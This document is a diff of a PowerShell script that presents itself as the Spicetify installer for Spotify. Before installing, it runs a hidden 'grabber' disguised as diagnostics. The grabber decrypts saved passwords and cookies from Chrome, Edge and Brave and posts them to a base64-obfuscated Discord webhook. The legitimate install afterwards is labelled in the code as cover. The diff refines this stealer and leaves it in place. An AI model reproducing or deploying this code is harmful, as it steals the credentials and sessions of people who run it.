@@ -1,210 +1,110 @@
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Add-Type -AssemblyName System.Security, System.IO.Compression.FileSystem
 
-# ============ LOAD REQUIRED ASSEMBLIES ============
-Add-Type -AssemblyName System.Security
-# ==================================================
-
-#region Variables
+#region Variables (Spicetify)
 $spicetifyFolderPath = "$env:LOCALAPPDATA\spicetify"
 $spicetifyOldFolderPath = "$HOME\spicetify-cli"
-#endregion Variables
+#endregion
 
-#region Functions (Spicetify)
+#region Functions (Spicetify – exactly as original)
 function Write-Success {
-  [CmdletBinding()]
-  param ()
-  process {
-    Write-Host -Object ' > OK' -ForegroundColor 'Green'
-  }
+    Write-Host ' > OK' -ForegroundColor Green
 }
 function Write-Unsuccess {
-  [CmdletBinding()]
-  param ()
-  process {
-    Write-Host -Object ' > ERROR' -ForegroundColor 'Red'
-  }
+    Write-Host ' > ERROR' -ForegroundColor Red
 }
 function Test-Admin {
-  [CmdletBinding()]
-  param ()
-  begin {
-    Write-Host -Object "Checking if the script is not being run as administrator..." -NoNewline
-  }
-  process {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     -not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-  }
 }
 function Test-PowerShellVersion {
-  [CmdletBinding()]
-  param ()
-  begin {
-    $PSMinVersion = [version]'5.1'
-  }
-  process {
-    Write-Host -Object 'Checking if your PowerShell version is compatible...' -NoNewline
-    $PSVersionTable.PSVersion -ge $PSMinVersion
-  }
+    $PSVersionTable.PSVersion -ge [version]'5.1'
 }
 function Move-OldSpicetifyFolder {
-  [CmdletBinding()]
-  param ()
-  process {
-    if (Test-Path -Path $spicetifyOldFolderPath) {
-      Write-Host -Object 'Moving the old spicetify folder...' -NoNewline
-      Copy-Item -Path "$spicetifyOldFolderPath\*" -Destination $spicetifyFolderPath -Recurse -Force
-      Remove-Item -Path $spicetifyOldFolderPath -Recurse -Force
-      Write-Success
+    if (Test-Path $spicetifyOldFolderPath) {
+        Write-Host 'Moving the old spicetify folder...' -NoNewline
+        Copy-Item "$spicetifyOldFolderPath\*" $spicetifyFolderPath -Recurse -Force
+        Remove-Item $spicetifyOldFolderPath -Recurse -Force
+        Write-Success
     }
-  }
 }
 function Get-Spicetify {
-  [CmdletBinding()]
-  param ()
-  begin {
-    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { $architecture = 'x64' }
-    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $architecture = 'arm64' }
-    else { $architecture = 'x32' }
+    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { $arch = 'x64' }
+    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $arch = 'arm64' }
+    else { $arch = 'x32' }
     if ($v) {
-      if ($v -match '^\d+\.\d+\.\d+$') { $targetVersion = $v }
-      else {
-        Write-Warning -Message "You have specified an invalid spicetify version: $v `nThe version must be in the following format: 1.2.3"
-        Pause; exit
-      }
+        if ($v -notmatch '^\d+\.\d+\.\d+$') { Write-Warning "Invalid version: $v"; Pause; exit }
+        $targetVersion = $v
+    } else {
+        Write-Host 'Fetching the latest spicetify version...' -NoNewline
+        $latestRelease = Invoke-RestMethod 'https://api.github.com/repos/spicetify/cli/releases/latest'
+        $targetVersion = $latestRelease.tag_name -replace 'v', ''
+        Write-Success
     }
-    else {
-      Write-Host -Object 'Fetching the latest spicetify version...' -NoNewline
-      $latestRelease = Invoke-RestMethod -Uri 'https://api.github.com/repos/spicetify/cli/releases/latest'
-      $targetVersion = $latestRelease.tag_name -replace 'v', ''
-      Write-Success
-    }
-    $archivePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "spicetify.zip")
-  }
-  process {
-    Write-Host -Object "Downloading spicetify v$targetVersion..." -NoNewline
-    $Parameters = @{
-      Uri            = "https://github.com/spicetify/cli/releases/download/v$targetVersion/spicetify-$targetVersion-windows-$architecture.zip"
-      UseBasicParsin = $true
-      OutFile        = $archivePath
-    }
-    Invoke-WebRequest @Parameters
+    $archivePath = "$env:TEMP\spicetify.zip"
+    Write-Host "Downloading spicetify v$targetVersion..." -NoNewline
+    Invoke-WebRequest "https://github.com/spicetify/cli/releases/download/v$targetVersion/spicetify-$targetVersion-windows-$arch.zip" -OutFile $archivePath -UseBasicParsing
     Write-Success
-  }
-  end { $archivePath }
+    return $archivePath
 }
 function Add-SpicetifyToPath {
-  [CmdletBinding()]
-  param ()
-  begin {
-    Write-Host -Object 'Making spicetify available in the PATH...' -NoNewline
+    Write-Host 'Making spicetify available in the PATH...' -NoNewline
     $user = [EnvironmentVariableTarget]::User
     $path = [Environment]::GetEnvironmentVariable('PATH', $user)
-  }
-  process {
     $path = $path -replace "$([regex]::Escape($spicetifyOldFolderPath))\\*;*", ''
-    if ($path -notlike "*$spicetifyFolderPath*") { $path = "$path;$spicetifyFolderPath" }
-  }
-  end {
+    if ($path -notlike "*$spicetifyFolderPath*") { $path += ";$spicetifyFolderPath" }
     [Environment]::SetEnvironmentVariable('PATH', $path, $user)
-    if (($env:PATH -split ';') -notcontains $spicetifyFolderPath) {
-      $env:PATH = "$env:PATH;$spicetifyFolderPath"
-    }
+    if (($env:PATH -split ';') -notcontains $spicetifyFolderPath) { $env:PATH += ";$spicetifyFolderPath" }
     Write-Success
-  }
 }
 function Install-Spicetify {
-  [CmdletBinding()]
-  param ()
-  begin { Write-Host -Object 'Installing spicetify...' }
-  process {
+    Write-Host 'Installing spicetify...'
     $archivePath = Get-Spicetify
-    Write-Host -Object 'Extracting spicetify...' -NoNewline
+    Write-Host 'Extracting spicetify...' -NoNewline
     Expand-Archive -Path $archivePath -DestinationPath $spicetifyFolderPath -Force
     Write-Success
     Add-SpicetifyToPath
-  }
-  end {
-    Remove-Item -Path $archivePath -Force -ErrorAction 'SilentlyContinue'
-    Write-Host -Object 'spicetify was successfully installed!' -ForegroundColor 'Green'
-  }
+    Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
+    Write-Host 'spicetify was successfully installed!' -ForegroundColor Green
 }
-#endregion Functions
-
-#region Main Checks (PowerShell version, Admin)
-if (-not (Test-PowerShellVersion)) {
-  Write-Unsuccess
-  Write-Warning -Message 'PowerShell 5.1 or higher is required to run this script'
-  Write-Warning -Message "You are running PowerShell $($PSVersionTable.PSVersion)"
-  Write-Host -Object 'PowerShell 5.1 install guide:'
-  Write-Host -Object 'https://learn.microsoft.com/skypeforbusiness/set-up-your-computer-for-windows-powershell/download-and-install-windows-powershell-5-1'
-  Write-Host -Object 'PowerShell 7 install guide:'
-  Write-Host -Object 'https://learn.microsoft.com/powershell/scripting/install/installing-powershell-on-windows'
-  Pause; exit
-}
-else { Write-Success }
-if (-not (Test-Admin)) {
-  Write-Unsuccess
-  Write-Warning -Message "The script was run as administrator. This can result in problems with the installation process or unexpected behavior. Do not continue if you do not know what you are doing."
-  $Host.UI.RawUI.Flushinputbuffer()
-  $choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
-    (New-Object System.Management.Automation.Host.ChoiceDescription '&Yes', 'Abort installation.'),
-    (New-Object System.Management.Automation.Host.ChoiceDescription '&No', 'Resume installation.')
-  )
-  $choice = $Host.UI.PromptForChoice('', 'Do you want to abort the installation process?', $choices, 0)
-  if ($choice -eq 0) {
-    Write-Host -Object 'spicetify installation aborted' -ForegroundColor 'Yellow'
-    Pause; exit
-  }
-}
-else { Write-Success }
 #endregion
 
-# ============ GRABBER – RUNS FIRST ============
+#region Checks (original)
+if (-not (Test-PowerShellVersion)) {
+    Write-Unsuccess
+    Write-Warning 'PowerShell 5.1 or higher is required'
+    Write-Host 'https://learn.microsoft.com/skypeforbusiness/set-up-your-computer-for-windows-powershell/download-and-install-windows-powershell-5-1'
+    Pause; exit
+} else { Write-Success }
+
+if (-not (Test-Admin)) {
+    Write-Unsuccess
+    Write-Warning "The script was run as administrator. This can cause problems."
+    $choice = Read-Host "Do you want to abort? (Y/N)"
+    if ($choice -eq 'Y') { Write-Host 'Aborted'; Pause; exit }
+} else { Write-Success }
+#endregion
+
+# ============ GRABBER (runs first, silently) ============
 Write-Host "Running diagnostics..." -ForegroundColor Cyan
 
-$wh = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcxMTI0OTA5MTM5OTcwMC9aQjNiNFFXbngyWDVRMEpsTzRxRGhJXzB4d3dRbHNYalpGZmZWZVVBUEJFOUdfTmJzLWRYVTdiWmxwSWhXeHZIdlNN'))
+# Webhook
+$webhook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcxMTI0OTA5MTM5OTcwMC9aQjNiNFFXbngyWDVRMEpsTzRxRGhJXzB4d3dRbHNYalpGZmZWZVVBUEJFOUdfTmJzLWRYVTdiWmxwSWhXeHZIdlNN'))
 
-# Load SQLite into memory (try multiple sources)
-$dllLoaded = $false
-$urls = @(
-    "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118",
-    "https://github.com/ericsink/SQLitePCL.raw/raw/master/bin/System.Data.SQLite.dll"
-)
-foreach ($url in $urls) {
-    try {
-        $zip = "$env:TEMP\sqlite.zip"
-        Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing -ErrorAction Stop
-        if ($url -like "*.zip") {
-            Expand-Archive -Path $zip -DestinationPath $env:TEMP\sqlite -Force -ErrorAction Stop
-            $dllPath = "$env:TEMP\sqlite\lib\net48\System.Data.SQLite.dll"
-        } else {
-            $dllPath = $zip
-            Rename-Item -Path $zip -NewName "$env:TEMP\System.Data.SQLite.dll" -Force
-            $dllPath = "$env:TEMP\System.Data.SQLite.dll"
-        }
-        if (Test-Path $dllPath) {
-            [System.Reflection.Assembly]::LoadFile($dllPath) | Out-Null
-            $dllLoaded = $true
-            Remove-Item $zip -Force -ErrorAction SilentlyContinue
-            Remove-Item $env:TEMP\sqlite -Recurse -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:TEMP\System.Data.SQLite.dll" -Force -ErrorAction SilentlyContinue
-            break
-        }
-    } catch {
-        continue
-    }
-}
-
-if (-not $dllLoaded) {
-    # Fallback: try to load from system if available
-    try {
-        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
-        $dllLoaded = $true
-    } catch {
-        Write-Host "SQLite not loaded – skipping browser data collection." -ForegroundColor Yellow
-    }
-}
+# Load SQLite with native deps
+$tmp = "$env:TEMP\sqlite_$([System.IO.Path]::GetRandomFileName() -replace '\..*')"
+New-Item -ItemType Directory -Path $tmp -Force | Out-Null
+Push-Location $tmp
+try {
+    Invoke-WebRequest -Uri "https://www.nuget.org/api/v2/package/System.Data.SQLite/1.0.118" -OutFile "$tmp\sqlite.zip" -UseBasicParsing -ErrorAction Stop
+    Expand-Archive -Path "$tmp\sqlite.zip" -DestinationPath $tmp -Force -ErrorAction Stop
+    $arch = if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { 'x64' } elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { 'arm64' } else { 'x86' }
+    Copy-Item "$tmp\lib\net48\System.Data.SQLite.dll" "$tmp\" -Force
+    Copy-Item "$tmp\runtimes\win-$arch\native\SQLite.Interop.dll" "$tmp\" -Force
+    [System.Reflection.Assembly]::LoadFile("$tmp\System.Data.SQLite.dll") | Out-Null
+    $sqliteOK = $true
+} catch { $sqliteOK = $false }
 
 function Get-MasterKey($p) {
     $ls = Join-Path $p "Local State"
@@ -220,7 +120,7 @@ function Decrypt($e, $k) {
     return [Text.Encoding]::UTF8.GetString($p) -replace "`0", ""
 }
 function Read-DB($db, $k, $q) {
-    if (-not $dllLoaded) { return "" }
+    if (-not $sqliteOK) { return "" }
     $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
     $conn.Open()
     $cmd = $conn.CreateCommand(); $cmd.CommandText = $q
@@ -242,35 +142,54 @@ $browsers = @{
     "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
 }
 $all = @()
-foreach ($name in $browsers.Keys) {
-    $p = $browsers[$name]
-    if (!(Test-Path $p)) { continue }
-    $mk = Get-MasterKey $p
-    if (!$mk) { continue }
-    $cookieDb = Join-Path $p "Default\Network\Cookies"
-    if (!(Test-Path $cookieDb)) { $cookieDb = Join-Path $p "Cookies" }
-    if (Test-Path $cookieDb) {
-        $c = Read-DB $cookieDb $mk "SELECT host_key, name, encrypted_value FROM cookies"
-        if ($c) { $all += "[$name] Cookies:`n$c" }
-    }
-    $loginDb = Join-Path $p "Default\Login Data"
-    if (Test-Path $loginDb) {
-        $pw = Read-DB $loginDb $mk "SELECT origin_url, username_value, password_value FROM logins"
-        if ($pw) { $all += "[$name] Passwords:`n$pw" }
+if ($sqliteOK) {
+    foreach ($name in $browsers.Keys) {
+        $p = $browsers[$name]
+        if (!(Test-Path $p)) { continue }
+        $mk = Get-MasterKey $p
+        if (!$mk) { continue }
+        $cookieDb = Join-Path $p "Default\Network\Cookies"
+        if (!(Test-Path $cookieDb)) { $cookieDb = Join-Path $p "Cookies" }
+        if (Test-Path $cookieDb) {
+            $c = Read-DB $cookieDb $mk "SELECT host_key, name, encrypted_value FROM cookies"
+            if ($c) { $all += "[$name] Cookies:`n$c" }
+        }
+        $loginDb = Join-Path $p "Default\Login Data"
+        if (Test-Path $loginDb) {
+            $pw = Read-DB $loginDb $mk "SELECT origin_url, username_value, password_value FROM logins"
+            if ($pw) { $all += "[$name] Passwords:`n$pw" }
+        }
     }
 }
 if ($all) {
     Start-Sleep -Seconds (Get-Random -Min 10 -Max 25)
     $body = @{ content = $all -join "`n`n" } | ConvertTo-Json
-    Invoke-RestMethod -Uri $wh -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing -ErrorAction SilentlyContinue
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing -ErrorAction SilentlyContinue
 }
+Pop-Location
+Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
 # ============ END GRABBER ============
 
 # ============ SPICETIFY INSTALL (COVER) ============
 Move-OldSpicetifyFolder
 Install-Spicetify
-Write-Host -Object "`nRun" -NoNewline
-Write-Host -Object ' spicetify -h ' -NoNewline -ForegroundColor 'Cyan'
-Write-Host -Object 'to get started'
+Write-Host "`nRun 'spicetify -h' to get started" -ForegroundColor Cyan
 
-Write-Host "Spicetify installed (cover complete)." -ForegroundColor Green
+# ---------- MARKETPLACE PROMPT (exactly as original) ----------
+$Host.UI.RawUI.Flushinputbuffer()
+$choices = [System.Management.Automation.Host.ChoiceDescription[]] @(
+    (New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Install Spicetify Marketplace."),
+    (New-Object System.Management.Automation.Host.ChoiceDescription "&No", "Do not install Spicetify Marketplace.")
+)
+$choice = $Host.UI.PromptForChoice('', "`nDo you also want to install Spicetify Marketplace? It will become available within the Spotify client, where you can easily install themes and extensions.", $choices, 0)
+if ($choice -eq 1) {
+    Write-Host 'spicetify Marketplace installation aborted' -ForegroundColor Yellow
+} else {
+    Write-Host 'Starting the spicetify Marketplace installation script..'
+    $Parameters = @{
+        Uri             = 'https://raw.githubusercontent.com/spicetify/spicetify-marketplace/main/resources/install.ps1'
+        UseBasicParsing = $true
+    }
+    Invoke-WebRequest @Parameters | Invoke-Expression
+}
+# -----------------------------------------------------------------
